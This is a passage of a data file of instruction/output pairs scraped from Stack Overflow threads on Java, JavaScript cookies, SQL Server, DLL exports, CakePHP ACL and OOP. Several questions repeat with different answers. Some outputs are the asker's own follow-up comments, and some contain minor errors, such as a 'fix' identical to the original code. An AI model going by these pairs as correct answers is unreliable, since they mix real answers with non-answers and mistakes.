\twindow.setContentPane(getJFSPanel());\n    \tgd.setFullScreenWindow(window);\n    \treturn window;\n    }\n\n    /**\n     * This method initializes jFSPanel\t\n     * \t\n     * @return javax.swing.JPanel\t\n     */\n    private JPanel getJFSPanel() {\n    \tif (jFSPanel == null) {\n    \t\tjLabel = new JLabel();\n    \t\tjLabel.setBounds(new Rectangle(18, 19, 500, 66));\n    \t\tjLabel.setText(\"Hello ! Now, juste open windows explorer and see what happens...\");\n    \t\tjFSPanel = new JPanel();\n    \t\tjFSPanel.setLayout(null);\n    \t\tjFSPanel.setSize(new Dimension(500, 107));\n    \t\tjFSPanel.add(jLabel, null);\n    \t}\n    \treturn jFSPanel;\n    }\n\n    /**\n     * @param args\n     */\n    public static void main(String[] args) {\n    \tFullScreenTest me = new FullScreenTest();\n    \tme.getJFrame().setVisible(true);\n\n    }\n\n}", "output": "The following code works (thank you John). With no full screen and a large \"always on top\" window.\nBut I still don't know why windows caused this stranged behavior...\nprivate Window initFullScreenWindow() {\n\tGraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();\n\tGraphicsDevice[] gds = ge.getScreenDevices();\n\tGraphicsDevice gd = gds[1];\n\tJWindow window = new JWindow(gd.getDefaultConfiguration());\n\twindow.setContentPane(getJFSPanel());\n\twindow.setLocation(1280, 0);\n\twindow.setSize(gd.getDisplayMode().getWidth(), gd.getDisplayMode().getHeight());\n\twindow.setAlwaysOnTop(true);\n\t//gd.setFullScreenWindow(window);\n\treturn window;\n}"}
{"instruction": "Getting back into a bit more .NET after a few-years of not using it full-time, and wondering what the good unit testing packages are these days.\nI'm familiar with NUnit (a few years ago), and have played briefly around with IronRuby, with the goal of getting something like rspec going, but don't know much beyond that.\nI realize I could google for this and call it a day but I believe I'm likely to get a better and more informed response from asking a question here :-)\nSuggestions?", "output": "I have made a small example of testing a .net lib using ironRuby:\nhttp://khebbie.dk/post/2008/08/Example-of-using-ironRubys-mini_rspec-library.aspx"}
{"instruction": "Okay, here is the 411 - I have the following event handler in my Global.asax.cs file:\nprivate void Global_PostRequestHandlerExecute(object sender, EventArgs e)\n{\n   if (/* logic that determines that this is an ajax call */)\n   {\n      // we want to set a cookie\n      Response.Cookies.Add(new HttpCookie(\"MyCookie\", \"true\"));\n   }\n}\n\nThat handler will run during Ajax requests (as a result of the Ajax framework I am using), as well as at other times - the condition of the if statement filters out non-Ajax events, and works just fine (it isn't relevant here, so I didn't include it for brevity's sake).\nIt suffices us to say that this works just fine - the cookie is set, I am able to read it on the client, and all is well up to that point.\nNow for the part that drives me nuts.\nHere is the JavaScript function I am using to delete the cookie:\nfunction deleteCookie(name) {\n   var cookieDate = new Date();\n   cookieDate.setTime(cookieDate.getTime() - 1);\n   document.cookie = (name + \"=; expires=\" + cookieDate.toGMTString());\n}\n\nSo, of course, at some point after the cookie is set, I delete it like so:\ndeleteCookie(\"MyCookie\");\n\nOnly, that doesn't do the job; the cookie still exists. So, anyone know why?", "output": "Have you tried to use \";expires=Thu, 01-Jan-1970 00:00:01 GMT\" ?"}
{"instruction": "Okay, here is the 411 - I have the following event handler in my Global.asax.cs file:\nprivate void Global_PostRequestHandlerExecute(object sender, EventArgs e)\n{\n   if (/* logic that determines that this is an ajax call */)\n   {\n      // we want to set a cookie\n      Response.Cookies.Add(new HttpCookie(\"MyCookie\", \"true\"));\n   }\n}\n\nThat handler will run during Ajax requests (as a result of the Ajax framework I am using), as well as at other times - the condition of the if statement filters out non-Ajax events, and works just fine (it isn't relevant here, so I didn't include it for brevity's sake).\nIt suffices us to say that this works just fine - the cookie is set, I am able to read it on the client, and all is well up to that point.\nNow for the part that drives me nuts.\nHere is the JavaScript function I am using to delete the cookie:\nfunction deleteCookie(name) {\n   var cookieDate = new Date();\n   cookieDate.setTime(cookieDate.getTime() - 1);\n   document.cookie = (name + \"=; expires=\" + cookieDate.toGMTString());\n}\n\nSo, of course, at some point after the cookie is set, I delete it like so:\ndeleteCookie(\"MyCookie\");\n\nOnly, that doesn't do the job; the cookie still exists. So, anyone know why?", "output": "Weird.. The code you pasted is almost verbatim to this: http://www.quirksmode.org/js/cookies.html which works fine..\nI know you are using Ajax, but have you tried quickly knocking it to server side code to see if that works? This may help in figuring if it is a problem with the JS or something else (e.g mystery file locking on the cookie)?\nUpdate\nJust had a quick Google, looks like there may be issues with browser settings as well. I don't think your problem is the code here, it's more likely to be something else. I would suggest try the above as PoC and we can move from there. :)"}
{"instruction": "I'm just wondering if there's a better way of doing this in SQL Server 2005.\nEffectively, I'm taking an originator_id (a number between 0 and 99) and a 'next_element' (it's really just a sequential counter between 1 and 999,999).\nWe are trying to create a 6-character 'code' from them. \nThe originator_id is multiplied up by a million, and then the counter added in, giving us a number between 0 and 99,999,999.\nThen we convert this into a 'base 32' string - a fake base 32, where we're really just using 0-9 and A-Z but with a few of the more confusing alphanums removed for clarity (I, O, S, Z).\nTo do this, we just divide the number up by powers of 32, at each stage using the result we get for each power as an index for a character from our array of selected character.\n\nThus, an originator ID of 61 and NextCodeElement of 9 gives a code of '1T5JA9'\n\n(61 * 1,000,000) + 9 = 61,000,009\n61,000,009 div (5^32 = 33,554,432) =  1 = '1'\n27,445,577 div (4^32 =  1,048,576) = 26 = 'T'\n   182,601 div (3^32 =     32,768) =  5 = '5'\n    18,761 div (2^32 =      1,024) = 18 = 'J'\n       329 div (1^32 =         32) = 10 = 'A'\n         9 div (0^32 =          1) =  9 = '9'\n\nso my code is 1T5JA9\n\nPreviously I've had this algorithm working (in Delphi) but now I really need to be able to recreate it in SQL Server 2005.  Obviously I don't quite have the same functions to hand that I have in Delphi, but this is my take on the routine. It works, and I can generate codes (or reconstruct codes back into their components) just fine.\nBut it looks a bit long-winded, and I'm not sure that the trick of selecting the result of a division into an int (ie casting it, really) is necessarily 'right' - is there a better SQLS approach to this kind of thing?\n\nCREATE procedure dummy_RP_CREATE_CODE @NextCodeElement int, @OriginatorID int,\n  @code varchar(6) output\nas\nbegin\n  declare @raw_num int;\n  declare @bcelems char(32);\n  declare @chr int;\n\n  select @bcelems='0123456789ABCDEFGHJKLMNPQRTUVWXY';\n  select @code='';\n\n  -- add in the originator_id, scaled into place\n  select @raw_num = (@OriginatorID * 1000000) + @NextCodeElement;\n\n  -- now to convert this to a 6-char code\n\n  -- 5^32\n  select @chr = @raw_num / 33554432;\n  select @raw_num = @raw_num - (@chr * 33554432);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 4^32\n  select @chr = @raw_num / 1048576;\n  select @raw_num = @raw_num - (@chr * 1048576);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 3^32\n  select @chr = @raw_num / 32768;\n  select @raw_num = @raw_num - (@chr * 32768);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 2^32\n  select @chr = @raw_num / 1024;\n  select @raw_num = @raw_num - (@chr * 1024);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 1^32\n  select @chr = @raw_num / 32;\n  select @raw_num = @raw_num - (@chr * 32);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 0^32  \n  select @code = @code + SUBSTRING(@bcelems, 1 + @raw_num, 1);\n\n  -- that's it!\nend;\n\nI'm not desperately concerned about optimisation unless this method is actually an order of magnitude (or so) worse than any alternative. \nThe code only ever gets executed in small bursts, maybe generating 20 or 30 codes every 10 minutes or so. Because of the large range of numbers I don't want to pre-calculate the codes into a huge table (only small pockets of the overall code range will be used in any given installation).\nHowever, I'm sure there's probably a tidier way of achieving the same result - particularly those divisions and subtractions.\nAny constructive criticism, observations or suggestions would be most welcome.", "output": "Although it can clearly be done in SQL Server 2005, I think that it's of sufficient 'non-database-ness' that some kind of precompiled, high-level language routine makese sense.\nI've written DLLs for Interbase/Firebird, and T-SQL sprocs for SQL Server, but never a CLR routine. It will be an interesting exercise!"}
{"instruction": "I have a class in system-C with some data members as such:  \nlong double x[8];\n\nI'm initializing it in the construction like this:\nfor (i = 0; i < 8; ++i) {\n    x[i] = 0;\n}\n\nBut the first time I use it in my code I have garbage there.\nBecause of the way the system is built I can't connect a debugger easily.  Are there any methods to set a data breakpoint in the code so that it tells me where in the code the variables were actually changed, but without hooking up a debugger?\nEdit:\n@Prakash: \nActually, this is a typo in the question, but not in my code...  Thanks!", "output": "Sure, it will be garbage!\nThe code should have been as \nfor (i = 0; i < 8; ++i) {\n    x[i] = 0;\n}\n\nEDIT: Oops, Sorry for underestimating ;)"}
{"instruction": "I have a class in system-C with some data members as such:  \nlong double x[8];\n\nI'm initializing it in the construction like this:\nfor (i = 0; i < 8; ++i) {\n    x[i] = 0;\n}\n\nBut the first time I use it in my code I have garbage there.\nBecause of the way the system is built I can't connect a debugger easily.  Are there any methods to set a data breakpoint in the code so that it tells me where in the code the variables were actually changed, but without hooking up a debugger?\nEdit:\n@Prakash: \nActually, this is a typo in the question, but not in my code...  Thanks!", "output": "Just use printk/syslog.\nIt's old-fashioned, but super duper easy."}
{"instruction": "Edit: Solved, there was a trigger with a loop on the table (read my own answer further below).\n\nWe have a simple delete statement that looks like this:\nDELETE FROM tablename WHERE pk = 12345\n\nThis just hangs, no timeout, no nothing.\nWe've looked at the execution plan, and it consists of many lookups on related tables to ensure no foreign keys would trip up the delete, but we've verified that none of those other tables have any rows referring to that particular row.\nThere is no other user connected to the database at this time.\nWe've run DBCC CHECKDB against it, and it reports 0 errors.\nLooking at the results of sp_who and sp_lock while the query is hanging, I notice that my spid has plenty of PAG and KEY locks, as well as the occasional TAB lock.\nThe table has 1.777.621 rows, and yes, pk is the primary key, so it's a single row delete based on index. There is no table scan in the execution plan, though I notice that it contains something that says Table Spool (Eager Spool), but says Estimated number of rows 1. Can this actually be a table-scan in disguise? It only says it looks at the primary key column.\nTried DBCC DBREINDEX and UPDATE STATISTICS on the table. Both completed within reasonable time.\nThere is unfortunately a high number of indexes on this particular table. It is the core table in our system, with plenty of columns, and references, both outgoing and incoming. The exact number is 48 indexes + the primary key clustered index.\nWhat else should we look at?\nNote also that this table did not have this problem before, this problem occured suddently today. We also have many databases with the same table setup (copies of customer databases), and they behave as expected, it's just this one that is problematic.", "output": "Ok, this is embarrasing.\nA collegue had added a trigger to that table a while ago, and the trigger had a bug. Although he had fixed the bug, the trigger had never been recreated for that table.\nSo the server was actually doing nothing, it just did it a huge number of times.\nOh well...\nThanks for the eyeballs to everyone who read this and pondered the problem.\nI'm going to accept Josef's answer, as his was the closest, and indirectly thouched upon the issue with the cascading deletes."}
{"instruction": "I have a class in system-C with some data members as such:  \nlong double x[8];\n\nI'm initializing it in the construction like this:\nfor (i = 0; i < 8; ++i) {\n    x[i] = 0;\n}\n\nBut the first time I use it in my code I have garbage there.\nBecause of the way the system is built I can't connect a debugger easily.  Are there any methods to set a data breakpoint in the code so that it tells me where in the code the variables were actually changed, but without hooking up a debugger?\nEdit:\n@Prakash: \nActually, this is a typo in the question, but not in my code...  Thanks!", "output": "@Frank\nActually, that lets me log debug prints to a file.  What I'm looking for is something that will let me print something whenever a variable changes, without me explicitly looking for the variable."}
{"instruction": "I have a class in system-C with some data members as such:  \nlong double x[8];\n\nI'm initializing it in the construction like this:\nfor (i = 0; i < 8; ++i) {\n    x[i] = 0;\n}\n\nBut the first time I use it in my code I have garbage there.\nBecause of the way the system is built I can't connect a debugger easily.  Are there any methods to set a data breakpoint in the code so that it tells me where in the code the variables were actually changed, but without hooking up a debugger?\nEdit:\n@Prakash: \nActually, this is a typo in the question, but not in my code...  Thanks!", "output": "How about Conditional breakpoints? You could try for various conditions like first element value is zero or non zero, etc??"}
{"instruction": "I have a foxpro app, that contains hard coded path for icons and bitmaps. That's how foxpro does it and there is no way around it. And this works fine, except that when a removable drive has been used but is not connected, and when is connected windows assigns the same letter as hard coded path, when opening any form that contains such path, the following error message apears (FROM WINDOWS, not fox):\nWindows-No disk\nException Processing Message c0000012 Parameters .....\nAny help please\nNelson Marmol", "output": "Nelson:\n\"That's how foxpro does it and there is no way around it\"?\nI'm using FOX since FoxPro 2.5 to Visual FoxPro 9, and you are NEVER forced in any way to hard-code a path, you can use SET PATH TO (sYourPath), you can embed the icons and bitmaps in your EXE / APP file and therefore there's no need of including this resources externally.\nYou say that you have a \"Foxpro App\": which version? Old MS-DOS FoxPro o Visual FoxPro?\nIf you're using VFP 8+, you can use SYS(2450, 1):\nSpecifies how an application searches for data and resources such as functions, procedures, executable files, and so on. \n\nYou can use SYS(2450) to specify that Visual FoxPro searches within an application for a specific procedure or user-defined function (UDF) before it searches along the SET DEFAULT and SET PATH locations. Setting SYS(2450) can help improve performance for applications that run on a local or wide area network.\n\n\nSYS(2450 [, 0 | 1 ])\n\n\n\nParameters\n0 \nSearch along path and default locations before searching in the application. (Default)\n\n1 \nSearch within the application for the specified procedure or UDF before searching the path and default locations.\n\nOne quick workaround could be assign another letter to your USB via the Disk Manager."}
{"instruction": "I have a class in system-C with some data members as such:  \nlong double x[8];\n\nI'm initializing it in the construction like this:\nfor (i = 0; i < 8; ++i) {\n    x[i] = 0;\n}\n\nBut the first time I use it in my code I have garbage there.\nBecause of the way the system is built I can't connect a debugger easily.  Are there any methods to set a data breakpoint in the code so that it tells me where in the code the variables were actually changed, but without hooking up a debugger?\nEdit:\n@Prakash: \nActually, this is a typo in the question, but not in my code...  Thanks!", "output": "That's assuming I can easily connect a debugger.  The whole point is that I only have a library, but the executable that linked it in isn't readily available."}
{"instruction": "I'm stuck on a fix to a legacy Visual C++ 6 app. In the C++ DLL source I have put\nextern \"C\" _declspec(dllexport) char* MyNewVariable = 0;\n\nwhich results in MyNewVariable showing up (nicely undecorated) in the export table (as shown by dumpbin /exports blah.dll). However, I can't figure out how to declare the variable so that I can access it in a C source file. I have tried various things, including\n_declspec(dllimport) char* MyNewVariable;\n\nbut that just gives me a linker error:\nunresolved external symbol \"__declspec(dllimport) char * MyNewVariable\" (__imp_?MyNewVariable@@3PADA)\nextern \"C\" _declspec(dllimport) char* MyNewVariable;\n\nas suggested by Tony (and as I tried before) results in a different expected decoration, but still hasn't removed it:\nunresolved external symbol __imp__MyNewVariable\nHow do I write the declaration so that the C++ DLL variable is accessible from the C app?\n\nThe Answer\nAs identified by botismarius and others (many thanks to all), I needed to link with the DLL's .lib. To prevent the name being mangled I needed to declare it (in the C source) with no decorators, which means I needed to use the .lib file.", "output": "extern \"C\" is how you remove decoration - it should work to use:\nextern \"C\" declspec(dllimport) char MyNewVariable;\nor if you want a header that can be used by C++ or C (with /TC switch)\n#ifdef __cplusplus\nextern \"C\" {\n#endif\ndeclspec(dllimport) char MyNewVariable;\n#ifdef __cplusplus\n}\n#endif\n\nAnd of course, link with the import library generated by the dll doing the export."}
{"instruction": "I'm stuck on a fix to a legacy Visual C++ 6 app. In the C++ DLL source I have put\nextern \"C\" _declspec(dllexport) char* MyNewVariable = 0;\n\nwhich results in MyNewVariable showing up (nicely undecorated) in the export table (as shown by dumpbin /exports blah.dll). However, I can't figure out how to declare the variable so that I can access it in a C source file. I have tried various things, including\n_declspec(dllimport) char* MyNewVariable;\n\nbut that just gives me a linker error:\nunresolved external symbol \"__declspec(dllimport) char * MyNewVariable\" (__imp_?MyNewVariable@@3PADA)\nextern \"C\" _declspec(dllimport) char* MyNewVariable;\n\nas suggested by Tony (and as I tried before) results in a different expected decoration, but still hasn't removed it:\nunresolved external symbol __imp__MyNewVariable\nHow do I write the declaration so that the C++ DLL variable is accessible from the C app?\n\nThe Answer\nAs identified by botismarius and others (many thanks to all), I needed to link with the DLL's .lib. To prevent the name being mangled I needed to declare it (in the C source) with no decorators, which means I needed to use the .lib file.", "output": "you must link against the lib generated after compiling the DLL. In the linker options of the project, you must add the .lib file. And yes, you should also declare the variable as:\nextern \"C\" { declspec(dllimport) char MyNewVariable; }"}
{"instruction": "I have a foxpro app, that contains hard coded path for icons and bitmaps. That's how foxpro does it and there is no way around it. And this works fine, except that when a removable drive has been used but is not connected, and when is connected windows assigns the same letter as hard coded path, when opening any form that contains such path, the following error message apears (FROM WINDOWS, not fox):\nWindows-No disk\nException Processing Message c0000012 Parameters .....\nAny help please\nNelson Marmol", "output": "I agree with @PabloG - it's been over a decade since I worked with FoxPro (Dos & Windows) but even back in FPW2.6 you could determine where your app was running 'from', set absolute or relative search paths and even bundle your resources straight into the \"compiled\" (heh) exe. All of our resources lived in a specific subfolder within the app folder, the database files in another subfolder also below the app folder. We used relative paths for everything as I recall.\nCan you give us a bit more information about the problem?\nIf you think it would be helpful I could try and dig out some of our FPW2.6 code where we're doing this kind of thing. :-)"}
{"instruction": "I've recently been working on a beginner's project in Scala, and have a beginner question about Scala's Lists.\nSay I have a list of tuples ( List[Tuple2[String, String]], for example). Is there a convenience method to return the first occurence of a specified tuple from the List, or is it necessary to iterate through the list by hand?", "output": "If you're learning scala, I'd take a good look at the Seq trait. It provides the basis for much of scala's functional goodness."}
{"instruction": "I'm stuck on a fix to a legacy Visual C++ 6 app. In the C++ DLL source I have put\nextern \"C\" _declspec(dllexport) char* MyNewVariable = 0;\n\nwhich results in MyNewVariable showing up (nicely undecorated) in the export table (as shown by dumpbin /exports blah.dll). However, I can't figure out how to declare the variable so that I can access it in a C source file. I have tried various things, including\n_declspec(dllimport) char* MyNewVariable;\n\nbut that just gives me a linker error:\nunresolved external symbol \"__declspec(dllimport) char * MyNewVariable\" (__imp_?MyNewVariable@@3PADA)\nextern \"C\" _declspec(dllimport) char* MyNewVariable;\n\nas suggested by Tony (and as I tried before) results in a different expected decoration, but still hasn't removed it:\nunresolved external symbol __imp__MyNewVariable\nHow do I write the declaration so that the C++ DLL variable is accessible from the C app?\n\nThe Answer\nAs identified by botismarius and others (many thanks to all), I needed to link with the DLL's .lib. To prevent the name being mangled I needed to declare it (in the C source) with no decorators, which means I needed to use the .lib file.", "output": "I'm not sure who downmodded botismarius, because he's right.  The reason is the .lib generated is the import library that makes it easy to simply declare the external variable/function with __declspec(dllimport) and just use it.  The import library simply automates the necessary LoadLibrary() and GetProcAddress() calls.  Without it, you need to call these manually."}
{"instruction": "I'm struggling to implement ACL in CakePHP.  After reading the documentation in the cake manual as well as several other tutorials, blog posts etc, I found Aran Johnson's excellent tutorial which has helped fill in many of the gaps.  His examples seem to conflict with others I've seen though in a few places - specifically in the ARO tree structure he uses.\nIn his examples his user groups are set up as a cascading tree, with the most general user type being at the top of the tree, and its children branching off for each more restricted access type.  Elsewhere I've usually seen each user type as a child of the same generic user type.  \nHow do you set up your AROs and ACOs in CakePHP?  Any and all tips appreciated!", "output": "CakePHP's built-in ACL system is really powerful, but poorly documented in terms of actual implementation details. A system that we've used with some success in a number of CakePHP-based projects is as follows.\nIt's a modification of some group-level access systems that have been documented elsewhere. Our system's aims are to have a simple system where users are authorised on a group-level, but they can have specific additional rights on items that were created by them, or on a per-user basis. We wanted to avoid having to create a specific entry for each user (or, more specifically for each ARO) in the aros_acos table.\nWe have a Users table, and a Roles table.\nUsers\nuser_id, user_name, role_id\nRoles\nid, role_name\nCreate the ARO tree for each role (we usually have 4 roles - Unauthorised Guest (id 1), Authorised User (id 2), Site Moderator (id 3) and Administrator (id 4)) :\ncake acl create aro / Role.1\ncake acl create aro 1 Role.2  ... etc ...\nAfter this, you have to use SQL or phpMyAdmin or similar to add aliases for all of these, as the cake command line tool doesn't do it. We use 'Role-{id}' and 'User-{id}' for all of ours.\nWe then create a ROOT ACO - \ncake acl create aco / 'ROOT'\nand then create ACOs for all the controllers under this ROOT one:\ncake acl create aco 'ROOT' 'MyController' ... etc ...\nSo far so normal. We add an additional field in the aros_acos table called _editown  which we can use as an additional action in the ACL component's actionMap.\nCREATE TABLE IF NOT EXISTS `aros_acos` (\n`id` int(11) NOT NULL auto_increment,\n`aro_id` int(11) default NULL,\n`aco_id` int(11) default NULL,\n`_create` int(11) NOT NULL default '0',\n`_read` int(11) NOT NULL default '0',\n`_update` int(11) NOT NULL default '0',\n`_delete` int(11) NOT NULL default '0',\n`_editown` int(11) NOT NULL default '0',\nPRIMARY KEY  (`id`),\nKEY `acl` (`aro_id`,`aco_id`)\n) ENGINE=InnoDB  DEFAULT CHARSET=utf8;\n\nWe can then setup the Auth component to use the 'crud' method, which validates the requested controller/action against an AclComponent::check(). In the app_controller we have something along the lines of:\nprivate function setupAuth() {\n    if(isset($this->Auth)) {\n        ....\n        $this->Auth->authorize = 'crud';\n        $this->Auth->actionMap = array( 'index'     => 'read',\n                        'add'       => 'create',\n                        'edit'      => 'update'\n                        'editMine'  => 'editown',\n                        'view'      => 'read'\n                        ... etc ...\n                        );\n        ... etc ...\n    }\n}\n\nAgain, this is fairly standard CakePHP stuff. We then have a checkAccess method in the AppController that adds in the group-level stuff to check whether to check a group ARO or a user ARO for access:\nprivate function checkAccess() {\n    if(!$user = $this->Auth->user()) {\n        $role_alias = 'Role-1';\n        $user_alias = null;\n    } else {\n        $role_alias = 'Role-' . $user['User']['role_id'];\n        $user_alias = 'User-' . $user['User']['id'];\n    }\n\n    // do we have an aro for this user?\n    if($user_alias && ($user_aro = $this->User->Aro->findByAlias($user_alias))) {\n        $aro_alias = $user_alias;\n    } else {\n        $aro_alias = $role_alias;\n    }\n\n    if ('editown' == $this->Auth->actionMap[$this->action]) {\n        if($this->Acl->check($aro_alias, $this->name, 'editown') and $this->isMine()) {\n            $this->Auth->allow();\n        } else {\n            $this->Auth->authorize = 'controller';\n            $this->Auth->deny('*');\n        }\n    } else {\n        // check this user-level aro for access\n        if($this->Acl->check($aro_alias, $this->name, $this->Auth->actionMap[$this->action])) {\n            $this->Auth->allow();\n        } else {\n            $this->Auth->authorize = 'controller';\n            $this->Auth->deny('*');\n        }\n    }\n}\n\nThe setupAuth() and checkAccess() methods are called in the AppController's beforeFilter() callback. There's an isMine method in the AppControler too (see below) that just checks that the user_id of the requested item is the same as the currently authenticated user. I've left this out for clarity.\nThat's really all there is to it. You can then allow / deny particular groups access to specific acos - \ncake acl grant 'Role-2' 'MyController' 'read'\ncake acl grant 'Role-2' 'MyController' 'editown'\ncake acl deny 'Role-2' 'MyController' 'update'\ncake acl deny 'Role-2' 'MyController' 'delete'\nI'm sure you get the picture.\nAnyway, this answer's way longer than I intended it to be, and it probably makes next to no sense, but I hope it's some help to you ...\n-- edit --\nAs requested, here's an edited (purely for clarity - there's a lot of stuff in our boilerplate code that's meaningless here) isMine() method that we have in our AppController. I've removed a lot of error checking stuff too, but this is the essence of it:\nfunction isMine($model=null, $id=null, $usermodel='User', $foreignkey='user_id') {\n    if(empty($model)) {\n        // default model is first item in $this->uses array\n        $model = $this->uses[0];\n    }\n\n    if(empty($id)) {\n        if(!empty($this->passedArgs['id'])) {\n        $id = $this->passedArgs['id'];\n        } elseif(!empty($this->passedArgs[0])) {\n            $id = $this->passedArgs[0];\n        }\n    }\n\n    if(is_array($id)) {\n        foreach($id as $i) {\n            if(!$this->_isMine($model, $i, $usermodel, $foreignkey)) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    return $this->_isMine($model, $id, $usermodel, $foreignkey);\n}\n\n\nfunction _isMine($model, $id, $usermodel='User', $foreignkey='user_id') {\n    $user = Configure::read('curr.loggedinuser'); // this is set in the UsersController on successful login\n\n    if(isset($this->$model)) {\n        $model = $this->$model;\n    } else {\n        $model = ClassRegistry::init($model);\n    }\n\n    //read model\n    if(!($record = $model->read(null, $id))) {\n        return false;\n    }\n\n    //get foreign key\n    if($usermodel == $model->alias) {\n        if($record[$model->alias][$model->primaryKey] == $user['User']['id']) {\n            return true;\n        }\n    } elseif($record[$model->alias][$foreignkey] == $user['User']['id']) {\n        return true;\n    }\n\n    return false;\n}"}
{"instruction": "I'm stuck on a fix to a legacy Visual C++ 6 app. In the C++ DLL source I have put\nextern \"C\" _declspec(dllexport) char* MyNewVariable = 0;\n\nwhich results in MyNewVariable showing up (nicely undecorated) in the export table (as shown by dumpbin /exports blah.dll). However, I can't figure out how to declare the variable so that I can access it in a C source file. I have tried various things, including\n_declspec(dllimport) char* MyNewVariable;\n\nbut that just gives me a linker error:\nunresolved external symbol \"__declspec(dllimport) char * MyNewVariable\" (__imp_?MyNewVariable@@3PADA)\nextern \"C\" _declspec(dllimport) char* MyNewVariable;\n\nas suggested by Tony (and as I tried before) results in a different expected decoration, but still hasn't removed it:\nunresolved external symbol __imp__MyNewVariable\nHow do I write the declaration so that the C++ DLL variable is accessible from the C app?\n\nThe Answer\nAs identified by botismarius and others (many thanks to all), I needed to link with the DLL's .lib. To prevent the name being mangled I needed to declare it (in the C source) with no decorators, which means I needed to use the .lib file.", "output": "They're both right. The fact that the error message describes __imp_?MyNewVariable@@3PADA means that it's looking for the decorated name, so the extern \"C\" is necessary. However, linking with the import library is also necessary or you'll just get a different link error."}
{"instruction": "I'm stuck on a fix to a legacy Visual C++ 6 app. In the C++ DLL source I have put\nextern \"C\" _declspec(dllexport) char* MyNewVariable = 0;\n\nwhich results in MyNewVariable showing up (nicely undecorated) in the export table (as shown by dumpbin /exports blah.dll). However, I can't figure out how to declare the variable so that I can access it in a C source file. I have tried various things, including\n_declspec(dllimport) char* MyNewVariable;\n\nbut that just gives me a linker error:\nunresolved external symbol \"__declspec(dllimport) char * MyNewVariable\" (__imp_?MyNewVariable@@3PADA)\nextern \"C\" _declspec(dllimport) char* MyNewVariable;\n\nas suggested by Tony (and as I tried before) results in a different expected decoration, but still hasn't removed it:\nunresolved external symbol __imp__MyNewVariable\nHow do I write the declaration so that the C++ DLL variable is accessible from the C app?\n\nThe Answer\nAs identified by botismarius and others (many thanks to all), I needed to link with the DLL's .lib. To prevent the name being mangled I needed to declare it (in the C source) with no decorators, which means I needed to use the .lib file.", "output": "@Graeme: You're right on that, too.  I think the \"C\" compiler that the OP is using is not enforcing C99 standard, but compiling as C++, thus mangling the names.  A true C compiler wouldn't understand the \"C\" part of the extern \"C\" keyword."}
{"instruction": "I've a class which is a wrapper class(serves as a common interface) around another class implementing the functionality required. So my code looks like this.\ntemplate<typename ImplemenationClass> class WrapperClass {\n// the code goes here\n}\n\nNow, how do I make sure that ImplementationClass can be derived from a set of classes only, similar to java's generics\n<? extends BaseClass>\n\nsyntax?", "output": "See Stoustrup's own words on the subject.\nBasically a small class, that you instantiate somewhere, e.g. the templated classes constructor.\ntemplate<class T, class B> struct Derived_from {\n\tstatic void constraints(T* p) { B* pb = p; }\n\tDerived_from() { void(*p)(T*) = constraints; }\n};"}
{"instruction": "I'm stuck on a fix to a legacy Visual C++ 6 app. In the C++ DLL source I have put\nextern \"C\" _declspec(dllexport) char* MyNewVariable = 0;\n\nwhich results in MyNewVariable showing up (nicely undecorated) in the export table (as shown by dumpbin /exports blah.dll). However, I can't figure out how to declare the variable so that I can access it in a C source file. I have tried various things, including\n_declspec(dllimport) char* MyNewVariable;\n\nbut that just gives me a linker error:\nunresolved external symbol \"__declspec(dllimport) char * MyNewVariable\" (__imp_?MyNewVariable@@3PADA)\nextern \"C\" _declspec(dllimport) char* MyNewVariable;\n\nas suggested by Tony (and as I tried before) results in a different expected decoration, but still hasn't removed it:\nunresolved external symbol __imp__MyNewVariable\nHow do I write the declaration so that the C++ DLL variable is accessible from the C app?\n\nThe Answer\nAs identified by botismarius and others (many thanks to all), I needed to link with the DLL's .lib. To prevent the name being mangled I needed to declare it (in the C source) with no decorators, which means I needed to use the .lib file.", "output": "I've never used _declspec(dllimport) when I was programming in Windows. You should be able to simply declare \nextern \"C\" char* MyNewVariable;\n\nand link to the .libb created when DLL was compiled."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "I agree completely with InSciTek Jeff's answer, I'll just add the following refinements:\n\nInformation hiding and encapsulation: Critical for any maintainable code.  Can be done by being careful in any programming language, doesn't require OO features, but doing it will make your code slightly OO-like.\nInheritance: There is one important application domain for which all those OO is-a-kind-of and contains-a relationships are a perfect fit:  Graphical User Interfaces.  If you try to build GUIs without OO language support, you will end up building OO-like features anyway, and it's harder and more error-prone without language support.  Glade (recently) and X11 Xt (historically) for example.\n\nUsing OO features (especially deeply nested abstract hierarchies), when there is no point, is pointless.  But for some application domains, there really is a point."}
